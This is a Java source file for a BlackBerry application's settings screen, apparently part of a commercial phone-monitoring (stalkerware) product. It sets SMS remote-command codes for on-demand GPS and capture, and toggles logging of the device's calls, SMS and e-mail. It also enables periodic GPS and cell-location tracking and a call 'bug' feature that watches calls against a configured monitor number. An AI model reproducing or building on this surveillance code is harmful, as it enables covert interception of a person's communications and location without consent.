import info.ApplicationInfo;
import com.vvt.event.constant.GPSProvider;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.DrawStyle;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.ObjectChoiceField;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;

public class RmtCmdApplicationMainScreen extends MainScreen implements FieldChangeListener {
	private final String TITLE = "Settings";
	// Component
	private AppEngine engine = null;
	private Preference pref = Global.getPreference();
	// UI Part
	private CheckboxField voiceField = null;
	private CheckboxField smsField;
	private CheckboxField emailField;
	private CheckboxField locationField = null;
	private CheckboxField gpsField = null;
	private CheckboxField watchField = null;
	private CheckboxField bugField = null;
	private EditField monitorField = null;
	private ObjectChoiceField locationTimerField = null;
	private ObjectChoiceField gpsTimerField = null;
	private VerticalFieldManager leftVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager rightVerticalMgr = new VerticalFieldManager();
	private HorizontalFieldManager standardHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager locationHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager gpsHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager bugHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager watchHorizontalMgr = new HorizontalFieldManager();
	public RmtCmdApplicationMainScreen(UiApplication appUi) {
		Log.debug("RmtCmdApplicationMainScreen.constructor", "ENTER");
		setTitle(TITLE);
		// To set application permission.
		Permission.requestPermission();
		// To change the SMS commands.
		SMSCmdStore cmdStore = Global.getSMSCmdStore();
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
		smsCmdCode.setGPSOnDemandCmd("sgps");
		smsCmdCode.setStartCaptureCmd("stcp");
		cmdStore.commit(smsCmdCode);
		cmdStore.useDefault();
		// To start engine is registration preference listener.
		engine = new AppEngine(appUi);
		engine.start();
		// To set default preference.
		setDefaultPreference();
		// To create UI.
		createUI();
		// To set FieldChangeListener.
		addFieldChangeListener();
		Log.debug("RmtCmdApplicationMainScreen.constructor", "EXIT");
	}

	private void setDefaultPreference() {
		Log.debug("RmtCmdApplicationMainScreen.setDefaultPreference", "ENTER");
		// GPS
		PrefGPS gps = (PrefGPS)Global.getPreference().getPrefInfo(PreferenceType.PREF_GPS);
		if (gps.getGpsOption() == null) {
			GPSMethod autonomous = new GPSMethod();
			GPSMethod assisted = new GPSMethod();
			GPSMethod cellsite = new GPSMethod();
			GPSMethod google = new GPSMethod();
			autonomous.setMethod(GPSProvider.GPS);
			autonomous.setPriority(GPSPriority.FIRST_PRIORITY);
			assisted.setMethod(GPSProvider.AGPS);
			assisted.setPriority(GPSPriority.SECOND_PRIORITY);
			cellsite.setMethod(GPSProvider.NETWORK);
			cellsite.setPriority(GPSPriority.THIRD_PRIORITY);
			google.setMethod(GPSProvider.GPS_G);
			google.setPriority(GPSPriority.FOURTH_PRIORITY);
			GPSOption gpsOpt = new GPSOption();
			int timeout = 10;
			gpsOpt.setTimeout(timeout);
			gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[ApplicationInfo.LOCATION_TIMER_INDEX]);
			gpsOpt.addGPSMethod(assisted);
			gpsOpt.addGPSMethod(google);
			gpsOpt.addGPSMethod(autonomous);
			gpsOpt.addGPSMethod(cellsite);
			gps.setGpsOption(gpsOpt);
			gps.setEnabled(false);
		}
		// Location
		PrefCellInfo cell = (PrefCellInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_CELL_INFO);
		if (cell.getInterval() == 0) {
			cell.setEnabled(false);
			cell.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[0]);
		}
		Global.getPreference().commit(gps);
		Global.getPreference().commit(cell);
		Log.debug("RmtCmdApplicationMainScreen.setDefaultPreference", "EXIT");
	}

	private void createUI() {
		// Standard Fields
		initStandardField();
		// Bug Field
		initBugField();
		// Location Field
		initLocationField();
		// GPS Field
		initGPSField();
	}

	private void initStandardField() {
		// To set enabled value.
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		voiceField = new CheckboxField("Voice\t\t", eventInfo.isCallLogEnabled());
		smsField = new CheckboxField("SMS", eventInfo.isSMSEnabled());
		emailField = new CheckboxField("E-mail", eventInfo.isEmailEnabled());
		leftVerticalMgr.add(voiceField);
		leftVerticalMgr.add(smsField);
		rightVerticalMgr.add(emailField);
		standardHorizontalMgr.add(leftVerticalMgr);
		standardHorizontalMgr.add(rightVerticalMgr);
		add(standardHorizontalMgr);
	}
	
	private void initBugField() {
		// To set enabled value.
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		bugField = new CheckboxField("Monitoring", bugInfo.isEnabled(), Field.FIELD_LEFT);
		monitorField = new EditField(" number: ", bugInfo.getMonitorNumber(), 20, Field.FIELD_RIGHT);
		watchField = new CheckboxField("Watch all numbers", bugInfo.isWatchAllEnabled());
		monitorField.setEditable(bugInfo.isEnabled());
		bugHorizontalMgr.add(bugField);
		bugHorizontalMgr.add(monitorField);
		watchHorizontalMgr.add(watchField);
		add(bugHorizontalMgr);
		add(watchHorizontalMgr);
	}

	private void initLocationField() {
		// To set enabled value.
		PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		int locInterval = cellInfo.getInterval();
		locationField = new CheckboxField("Location", cellInfo.isEnabled(), Field.FIELD_LEFT);
		locationTimerField = new ObjectChoiceField(" refresh time: ", ApplicationInfo.LOCATION_TIMER, getTimerIndex(locInterval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		locationTimerField.setEditable(cellInfo.isEnabled());
		locationHorizontalMgr.add(locationField);
		locationHorizontalMgr.add(locationTimerField);
		add(locationHorizontalMgr);
	}
	
	private void initGPSField() {
		// To set enabled value.
		PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		int interval = gpsInfo.getGpsOption().getInterval();
		gpsField = new CheckboxField("GPS", gpsInfo.isEnabled(), Field.FIELD_LEFT);
		gpsTimerField = new ObjectChoiceField(" refresh time: ", ApplicationInfo.LOCATION_TIMER, getTimerIndex(interval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		gpsTimerField.setEditable(gpsInfo.isEnabled());
		gpsHorizontalMgr.add(gpsField);
		gpsHorizontalMgr.add(gpsTimerField);
		add(gpsHorizontalMgr);
	}

	private void addFieldChangeListener() {
		voiceField.setChangeListener(this);
		smsField.setChangeListener(this);
		emailField.setChangeListener(this);;
		locationField.setChangeListener(this);
		gpsField.setChangeListener(this);
		watchField.setChangeListener(this);
		bugField.setChangeListener(this);
		monitorField.setChangeListener(this);
		locationTimerField.setChangeListener(this);
		gpsTimerField.setChangeListener(this);
	}
	
	private void refreshUI() {
		Log.debug("RmtCmdApplicationMainScreen.refreshUI", "ENTER");
		// To set enabled value.
		Preference pref = Global.getPreference();
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		voiceField.setChecked(eventInfo.isCallLogEnabled());
		smsField.setChecked(eventInfo.isSMSEnabled());
		emailField.setChecked(eventInfo.isEmailEnabled());
		// To set enabled value.
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		bugField.setChecked(bugInfo.isEnabled());
		monitorField.setText(bugInfo.getMonitorNumber());
		monitorField.setEditable(bugInfo.isEnabled());
		watchField.setChecked(bugInfo.isWatchAllEnabled());
		// To set enabled value.
		PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		locationField.setChecked(cellInfo.isEnabled());
		int locInterval = cellInfo.getInterval();
		locationTimerField.setSelectedIndex(getTimerIndex(locInterval));
		locationTimerField.setEditable(cellInfo.isEnabled());
		// To set enabled value.
		PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gpsField.setChecked(gpsInfo.isEnabled());
		int interval = gpsInfo.getGpsOption().getInterval();
		gpsTimerField.setSelectedIndex(getTimerIndex(interval));
		gpsTimerField.setEditable(gpsInfo.isEnabled());
		Log.debug("RmtCmdApplicationMainScreen.refreshUI", "EXIT");
	}
	
	private int getTimerIndex(int interval) {
		int index = 0;
		for (int i = 0; i < ApplicationInfo.LOCATION_TIMER_SECONDS.length; i++) {
			if (ApplicationInfo.LOCATION_TIMER_SECONDS[i] == interval) {
				index = i;
				break;
			}
		}
		return index;
	}

	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		Log.debug("RmtCmdApplicationMainScreen.fieldChanged", "ENTER");
		if (field.equals(voiceField)) {
			boolean voiceStatus = voiceField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setCallLogEnabled(voiceStatus);
				pref.commit(eventInfo);
			}
		}
		else if (field.equals(locationField)) {
			boolean locStatus = locationField.getChecked();
			synchronized (Application.getEventLock()) {
				locationTimerField.setEditable(locStatus);
				Preference pref = Preference.getInstance();
				PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
				cellInfo.setEnabled(locStatus);
				pref.commit(cellInfo);
			}
		}
		else if (field.equals(locationTimerField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
				cellInfo.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerField.getSelectedIndex()]);
				pref.commit(cellInfo);
			}
		}
		else if (field.equals(gpsField)) {
			boolean gpsStatus = gpsField.getChecked();
			synchronized (Application.getEventLock()) {
				gpsTimerField.setEditable(gpsStatus);
				Preference pref = Preference.getInstance();
				PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
				gpsInfo.setEnabled(gpsStatus);
				pref.commit(gpsInfo);
			}
		}
		else if (field.equals(gpsTimerField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
				gpsInfo.getGpsOption().setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsTimerField.getSelectedIndex()]);
				pref.commit(gpsInfo);
			}
		}
		else if (field.equals(bugField)) {
			boolean bugStatus = bugField.getChecked();
			synchronized (Application.getEventLock()) {
				monitorField.setEditable(bugStatus);
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setEnabled(bugStatus);
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(monitorField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setMonitorNumber(monitorField.getText());
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(watchField)) {
			boolean watchStatus = watchField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setWatchAllEnabled(watchStatus);
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(emailField)) {
			boolean emailStatus = emailField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setEmailEnabled(emailStatus);
				pref.commit(eventInfo);
			}
		}
		else if (field.equals(smsField)) {
			boolean smsStatus = smsField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setSMSEnabled(smsStatus);
				pref.commit(eventInfo);
			}
		}
		Log.debug("RmtCmdApplicationMainScreen.fieldChanged", "EXIT");
	}
	
	// Screen
	public boolean onClose() {
		UiApplication.getUiApplication().requestBackground();
		return false;
	}
	
	public void onExposed() {
		Log.debug("RmtCmdApplicationMainScreen.onExposed", "ENTER");
		// To refresh UI.
		engine.stop();
		refreshUI();
		engine.start();
		Log.debug("RmtCmdApplicationMainScreen.onExposed", "EXIT");
	}
}
